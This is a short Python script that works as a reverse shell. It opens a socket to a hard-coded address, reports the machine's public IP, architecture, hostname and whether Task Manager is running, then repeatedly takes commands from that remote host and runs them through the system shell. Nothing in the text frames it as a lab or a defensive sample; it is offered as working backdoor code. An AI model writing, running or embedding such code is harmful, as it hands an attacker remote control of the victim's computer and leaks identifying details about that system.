import socket 
import os
import platform
import requests
import cmd 
import subprocess
addr = ("192.168.2.15",5433)
with socket.create_connection(addr) as p:
    r = requests.get("https://api.myip.com")
    decode = r.content.decode()
    result = subprocess.run("tasklist | findstr Taskmgr.exe", shell=True, capture_output=True, text=True)
    stuff = f"IP Address: {decode}|Machine Type: {platform.machine()}|Device Name: {platform.node()}| Result: {result.stdout}"
    p.send(stuff.encode())

    for x in range(999):
        f = p.recv(4000)
        print(f.decode())
        g = subprocess.run(f.decode(), shell=True)
        
